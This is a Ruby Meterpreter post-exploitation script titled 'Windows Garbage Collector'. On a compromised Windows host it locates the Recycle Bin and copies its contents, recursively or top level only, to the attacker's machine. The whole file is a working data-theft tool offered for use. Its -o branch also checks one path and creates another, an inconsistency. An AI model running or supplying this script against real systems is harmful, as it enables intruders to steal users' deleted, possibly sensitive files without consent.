#Autor: Pablo Gonzalez
#Windows Garbage Collector v1

def downloading(remoto,local)
	print_status remoto

	dirs = client.fs.dir.entries_with_info(remoto)

	dirs.each do |d|
		next if d["FileName"] == "." || d["FileName"] == ".."
				
		mode = d["StatBuf"].stathash["st_mode"]

		if mode.to_s =~ /(^16)|(^17)/
			print_status "It is a directory #{mode} #{d["FilePath"]}"

			if !::File.exists?(local+d["FileName"])
				Dir.mkdir(local+d["FileName"])
			end

			client.fs.dir.download(local+"/"+d["FileName"],d["FilePath"])
			downloading(d["FilePath"],local+d["FileName"]+"/")

		else

			print_status "It is a file #{mode} #{d["FilePath"]}"

			client.fs.file.download(local+"/"+d["FileName"],d["FilePath"])
		end

	end

end

if client.platform !~ /win32|win64/
	print_line "No compatible"
	raise Rex::Script::Completed
end

opts = Rex::Parser::Arguments.new(
	"-h" => [false, "Help menu"],
	"-g" => [false, "GarbageCollector"],
	"-o" => [false, "Only Files"]
)

info = client.sys.config.sysinfo()

if info['OS'] =~ /Windows XP/
	garbage = 'c:\\Recycler\\'
else
	garbage = 'c:\\$Recycle.bin\\'
end 	

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Help Menu"
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-g"
		print_status "Recursive Downloading Garbage..."
		downloading(garbage,"./")
	when "-o"
		print_status "Downloading Garbage..."
		dirs = client.fs.dir.entries(garbage)
		dirs.each {|i|
			if i != "." && i != ".."
				print_status i
				
#Descarga del contenido de una carpeta, ficheros de una carpeta
				if !File.exists?(i)
					Dir.mkdir("~/"+i)
				end		
				client.fs.dir.download("./"+i, garbage+i)
			end
		}
	end
}
